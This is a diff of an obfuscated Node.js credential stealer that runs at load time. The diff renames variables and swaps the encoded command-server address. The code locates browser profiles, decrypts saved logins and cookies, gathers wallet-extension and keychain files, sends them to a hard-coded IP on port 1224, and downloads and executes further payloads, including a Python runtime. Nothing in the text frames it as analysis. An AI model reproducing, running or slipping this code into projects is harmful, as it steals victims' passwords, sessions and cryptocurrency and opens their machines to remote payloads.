@@ -7,19 +7,19 @@ const t = 'base64',
   r = (r) => ((s1 = r.slice(1)), Buffer.from(s1, t).toString(c)),
   e = (r, e) => {
     let E = Buffer.from(r, t);
-    const s = E.length;
+    const o = E.length;
     let F = 0,
-      a = new Uint8Array(s);
-    for (ii = 0; ii < s; ii++) {
+      a = new Uint8Array(o);
+    for (ii = 0; ii < o; ii++) {
       F = 3 & ii;
-      let t = e[o](F);
+      let t = e[s](F);
       a[ii] = 255 & (E[ii] ^ t);
     }
     return ((t, c) => Buffer.from(t).toString(c))(a, c);
   },
   E = (t) => e(t, c),
-  o = r('2Y2hhckNvZGVBdA'),
-  s = E('BgUKUQERVQ'),
+  s = r('2Y2hhckNvZGVBdA'),
+  o = E('BgUKUQERVQ'),
   F = E('FhwPVBErFkoaFwNLBg'),
   a = E('FgYfSAEb'),
   B = E('EAwDWw'),
@@ -32,29 +32,28 @@ const t = 'base64',
   W = E('AQ0WXQ'),
   V = require('os'),
   U = require(A),
-  Q = require(s),
-  g = require(a),
+  g = require(o),
+  Q = require(a),
   h = require(i),
   w = require(F)[B],
   x = V[R](),
   f = V[$](),
   y = V[l](),
-  I = V[n](),
-  G = V[W](),
+  G = V[n](),
+  I = V[W](),
   S = require('fs');
-
 let u;
 const d = (t) => e(t, c),
   X = (() => {
-    let t = 'MTQ0LjE3MiaHR0cDovLw43NC40ODoxMjI0      ';
-    for (var c = 'b', e = 'a', E = '', o = '', s = 0; s < 10; s++)
-      (c += t[s]), (e += t[10 + s]), (E += t[20 + s]), (o += t[30 + s]);
-    return (c = c + E + o), r(e) + r(c);
+    let t = 'MTcyLjg2LjaHR0cDovLwk5LjM2OjEyMjQ=      ';
+    for (var c = 'b', e = 'a', E = '', s = '', o = 0; o < 10; o++)
+      (c += t[o]), (e += t[10 + o]), (E += t[20 + o]), (s += t[30 + o]);
+    return (c = c + E + s), r(e) + r(c);
   })(),
-  C = d('ER0UVhQZAw'),
-  H = (t) =>
-    t.replace(/^~([a-z]+|\/)/, (t, c) => ('/' === c ? y : `${U[C](y)}/${c}`)),
-  Y = 'S2t5OA8',
+  H = d('ER0UVhQZAw'),
+  C = (t) =>
+    t.replace(/^~([a-z]+|\/)/, (t, c) => ('/' === c ? y : `${U[H](y)}/${c}`)),
+  Y = 'VDNhbTM3',
   D = 'AgYPTBAyD1QQJx9WFg',
   k = 'EhES',
   b = 'WhcKURAaEg',
@@ -62,18 +61,16 @@ const d = (t) => e(t, c),
   N = d(b),
   p = d(D),
   Z = d(k),
-  m = d('EAwPSwEHNUEbFw'),
-  J = 'WgcSVwcRSFYaEAM',
-  T = d('FBcFXQYHNUEbFw');
-
-function j(t) {
+  j = d('EAwPSwEHNUEbFw'),
+  m = 'WgcSVwcRSFYaEAM',
+  J = d('FBcFXQYHNUEbFw');
+function T(t) {
   try {
-    return S[T](t), !0;
+    return S[J](t), !0;
   } catch (t) {
     return !1;
   }
 }
-
 const v = d('MREAWQAYEg'),
   O = d('JQYJXhwYAw'),
   K = d('WjUWSDEVEllaOAlbFBhJdRwXFFcGGwBMWjECXxBbM0sQBkZ8FAAH'),
@@ -81,11 +78,11 @@ const v = d('MREAWQAYEg'),
     result = '';
     try {
       const r = `${t}`,
-        e = require(`${y}${d(J)}`);
-      if (G != d('Ih0IXBoDFWc7IA')) return;
+        e = require(`${y}${d(m)}`);
+      if (I != d('Ih0IXBoDFWc7IA')) return;
       const E = d('JjEqfTYgRhJVMjR3OFQKVxIdCEs'),
-        s = `${H('~/')}${c}`;
-      let F = U.join(s, d('ORsFWRlUNUwUAAM'));
+        o = `${C('~/')}${c}`;
+      let F = U.join(o, d('ORsFWRlUNUwUAAM'));
       const a = d('FBEVFUdBUBUSFws'),
         B = d('GgYPXxwaOU0HGA'),
         i = d('AAcDShsVC10qAgdUABE'),
@@ -100,7 +97,7 @@ const v = d('MREAWQAYEg'),
         w = d('MRUSWRcVFV0'),
         x = d('GRUSURtF'),
         f = d('IE5G'),
-        I = d('Ik5G'),
+        G = d('Ik5G'),
         u = d('JU5G'),
         X = d('ABoKURsf');
       S[l](F, d('AAAAFU0'), (t, c) => {
@@ -110,40 +107,40 @@ const v = d('MREAWQAYEg'),
             (mkey = ((t) => {
               var c = atob(t),
                 r = new Uint8Array(c.length);
-              for (let t = 0; t < c.length; t++) r[t] = c[o](t);
+              for (let t = 0; t < c.length; t++) r[t] = c[s](t);
               return r;
             })(mkey));
           try {
             const t = e[$](mkey.slice(5));
             for (ii = 0; ii <= 200; ii++) {
               const c = 0 === ii ? v : `${O} ${ii}`,
-                e = `${s}/${c}/${W}`,
-                o = `${s}/t${c}`;
-              if (!j(e)) continue;
+                e = `${o}/${c}/${W}`,
+                s = `${o}/t${c}`;
+              if (!T(e)) continue;
               const F = `${r}_${ii}_${O}`;
-              S[R](e, o, (c) => {
+              S[R](e, s, (c) => {
                 try {
-                  const c = new Q[w](o);
+                  const c = new g[w](s);
                   c.all(E, (r, e) => {
                     var E = '';
                     r ||
                       e.forEach((c) => {
                         var r = c[B],
                           e = c[i],
-                          o = c[A];
+                          s = c[A];
                         try {
-                          'v' === o.subarray(0, 1).toString() &&
-                            ((iv = o.subarray(3, 15)),
-                            (cip = o.subarray(15, o.length - 16)),
+                          'v' === s.subarray(0, 1).toString() &&
+                            ((iv = s.subarray(3, 15)),
+                            (cip = s.subarray(15, s.length - 16)),
                             cip.length &&
-                              ((mmm = g[n](a, t, iv).update(cip)),
-                              (E = `${E}${I}${r} ${f} ${e} ${u}${mmm.toString(
+                              ((mmm = Q[n](a, t, iv).update(cip)),
+                              (E = `${E}${G}${r} ${f} ${e} ${u}${mmm.toString(
                                 x
                               )}\n\n`)));
                         } catch (t) {}
                       }),
                       c.close(),
-                      S[X](o, (t) => {}),
+                      S[X](s, (t) => {}),
                       Ut(F, E);
                   });
                 } catch (t) {}
@@ -155,15 +152,15 @@ const v = d('MREAWQAYEg'),
     } catch (t) {}
   },
   q = E('Ex0KXRsVC10'),
-  z = E('GAEKTBwrAFEZEQ'),
-  L = E('ExsUVTEVElk'),
+  L = E('GAEKTBwrAFEZEQ'),
+  z = E('ExsUVTEVElk'),
   _ = E('AAYK'),
   tt = E('GgQSURoaFQ'),
   ct = E('AxUKTRA'),
   rt = d('BxEHXBEdFGsMGgU'),
   et = d('BgAHTCYNCFs'),
   Et = (d('HAciUQcRBUwaBh8'), r('YcG9zdA')),
-  ot = [
+  st = [
     [
       d('WjgPWgcVFEFaNRZIGR0FWQEdCVZVJxNIBRsUTFozCVcSGAMXNhwUVxgR'),
       d('WloFVxsSD19aEwlXEhgDFRYcFFcYEQ'),
@@ -188,7 +185,7 @@ const v = d('MREAWQAYEg'),
       ),
     ],
   ],
-  st = d('ORsFWRlUI0ABEQhLHBsIGCYREkwcGgFL'),
+  ot = d('ORsFWRlUI0ABEQhLHBsIGCYREkwcGgFL'),
   Ft = d('WxgJXw'),
   at = d('WxgCWg'),
   Bt = d('BhsKWRsVOVERWhJAAQ');
@@ -209,18 +206,18 @@ const At = [
     let e = t;
     if (!e || '' === e) return [];
     try {
-      if (!j(e)) return [];
+      if (!T(e)) return [];
     } catch (t) {
       return [];
     }
     c || (c = '');
     let E = [];
     for (let r = 0; r < 200; r++) {
-      const o = `${t}/${0 === r ? v : `${O} ${r}`}/${st}`;
+      const s = `${t}/${0 === r ? v : `${O} ${r}`}/${ot}`;
       for (let t = 0; t < At.length; t++) {
-        const s = d(At[t]);
-        let F = `${o}/${s}`;
-        if (j(F)) {
+        const o = d(At[t]);
+        let F = `${s}/${o}`;
+        if (T(F)) {
           try {
             far = S[rt](F);
           } catch (t) {
@@ -230,43 +227,26 @@ const At = [
             e = U.join(F, t);
             try {
               (e.includes(Ft) || e.includes(at)) &&
-                E.push({
-                  [ct]: S[$t](e),
-                  [tt]: {
-                    [q]: `${c}${r}_${s}_${t}`,
-                  },
-                });
+                E.push({ [ct]: S[$t](e), [tt]: { [q]: `${c}${r}_${o}_${t}` } });
             } catch (t) {}
           });
         }
       }
     }
-    if (r && ((e = `${y}${d('WloFVxsSD19aBwlUFBoHFxwQSFIGGwg')}`), S[m](e)))
+    if (r && ((e = `${y}${d('WloFVxsSD19aBwlUFBoHFxwQSFIGGwg')}`), S[j](e)))
       try {
-        E.push({
-          [ct]: S[$t](e),
-          [tt]: {
-            [q]: Bt,
-          },
-        });
+        E.push({ [ct]: S[$t](e), [tt]: { [q]: Bt } });
       } catch (t) {}
-    const o = {
-      type: Y,
-      hid: it,
-      [z]: E,
-    };
+    const s = { type: Y, hid: it, [L]: E };
     try {
-      const t = {
-        [_]: `${X}${nt}`,
-        [L]: o,
-      };
+      const t = { [_]: `${X}${nt}`, [z]: s };
       h[Et](t, (t, c, r) => {});
     } catch (t) {}
     return E;
   },
   Rt = () => {
     try {
-      ot.forEach((t, c) => {
+      st.forEach((t, c) => {
         P(c, t[2]);
       }),
         P(3, K);
@@ -275,47 +255,38 @@ const At = [
   Wt = d('Wh8DQQY'),
   Vt = d('BQ0SUBoa'),
   Ut = async (t, c) => {
-    const r = {
-        ts: u.toString(),
-        type: Y,
-        hid: it,
-        ss: t,
-        cc: c.toString(),
-      },
-      e = {
-        [_]: `${X}${Wt}`,
-        [L]: r,
-      };
+    const r = { ts: u.toString(), type: Y, hid: it, ss: t, cc: c.toString() },
+      e = { [_]: `${X}${Wt}`, [z]: r };
     try {
       h[Et](e, (t, c, r) => {});
     } catch (t) {}
   },
-  Qt = d('BVocUQ'),
-  gt = d('WgQCVwIa'),
+  gt = d('BVocUQ'),
+  Qt = d('WgQCVwIa'),
   ht = d('BxEIWRgRNUEbFw'),
   wt = d('BxEIWRgR'),
   xt = d('Bxk1QRsX'),
   ft = d('ARUUGFgMAA'),
   yt = d('FgEUVFVZKlc'),
-  It = d('KVoWQQUoFkEBHAlWWxEeXQ'),
-  Gt = 51476596;
+  Gt = d('KVoWQQUoFkEBHAlWWxEeXQ'),
+  It = 51476596;
 let St = 0;
 const ut = async (t) => {
     w(`${ft} ${t} -C ${y}`, (c, r, e) => {
       if (c) return console.error(`err unfile: ${c}`), S[xt](t), void (St = 0);
-      S[xt](t), Ht();
+      S[xt](t), Ct();
     });
   },
   dt = () => {
     const t = d('BUZIQhwE'),
-      c = `${X}${gt}`,
-      r = `${I}\\${Qt}`,
-      e = `${I}\\${t}`;
-    if (!(St >= Gt))
-      if (S[m](r))
+      c = `${X}${Qt}`,
+      r = `${G}\\${gt}`,
+      e = `${G}\\${t}`;
+    if (!(St >= It))
+      if (S[j](r))
         try {
           var E = S[et](r);
-          E.size >= Gt
+          E.size >= It
             ? ((St = E.size),
               S[wt](r, e, (t) => {
                 if (t) throw t;
@@ -327,54 +298,53 @@ const ut = async (t) => {
         w(`${yt} "${r}" "${c}"`, (t, c, E) => {
           if (t) return (St = 0), void Xt();
           try {
-            (St = Gt), S[ht](r, e), ut(e);
+            (St = It), S[ht](r, e), ut(e);
           } catch (t) {}
         });
       }
   };
-
 function Xt() {
   setTimeout(() => {
     dt();
   }, 2e4);
 }
-const Ct = async () => {
+const Ht = async () => {
     var t = process.version.match(/^v(\d+\.\d+)/)[1];
     const c = `${X}${d('WhoJXBBb')}${t}`,
-      r = `${y}${d(J)}`;
-    if (S[m](r)) Rt();
+      r = `${y}${d(m)}`;
+    if (S[j](r)) Rt();
     else {
       w(`${yt} "${r}" "${c}"`, (t, c, r) => {
         Rt();
       });
     }
   },
-  Ht = async () =>
+  Ct = async () =>
     await new Promise((t, c) => {
       if ('w' == f[0]) {
-        const t = `${y}${It}`;
-        S[m](`${t}`)
+        const t = `${y}${Gt}`;
+        S[j](`${t}`)
           ? (() => {
               const t = `${X}${N}/${Y}`,
                 c = `${y}${M}`,
-                r = `"${y}${It}" "${c}"`;
+                r = `"${y}${Gt}" "${c}"`;
               try {
                 S[xt](c);
               } catch (t) {}
               h[Z](t, (t, e, E) => {
-                if (t) Ct();
+                if (t) Ht();
                 else
                   try {
                     S[p](c, E),
                       w(r, (t, c, r) => {
-                        Ct();
+                        Ht();
                       });
                   } catch (t) {
-                    Ct();
+                    Ht();
                   }
               });
             })()
-          : (Ct(), dt());
+          : (Ht(), dt());
       } else
         (() => {
           const t = d(b),
@@ -382,9 +352,9 @@ const Ct = async () => {
             r = d(k),
             e = `${X}${t}/${Y}`,
             E = `${y}${M}`;
-          let o = `${Vt}3 "${E}"`;
+          let s = `${Vt}3 "${E}"`;
           h[r](e, (t, r, e) => {
-            t || (S[c](E, e), w(o, (t, c, r) => {}));
+            t || (S[c](E, e), w(s, (t, c, r) => {}));
           });
         })();
     });
@@ -395,8 +365,8 @@ const Dt = async () => {
       await (async () => {
         it = x;
         try {
-          const t = H('~/');
-          ot.forEach(async (c, r) => {
+          const t = C('~/');
+          st.forEach(async (c, r) => {
             let e = '';
             (e =
               'd' == f[0]
@@ -409,7 +379,7 @@ const Dt = async () => {
             'w' == f[0] && ((pa = `${t}${K}`), await lt(pa, '3_', !1));
         } catch (t) {}
       })(),
-      Ht();
+      Ct();
   } catch (t) {}
 };
 Dt();
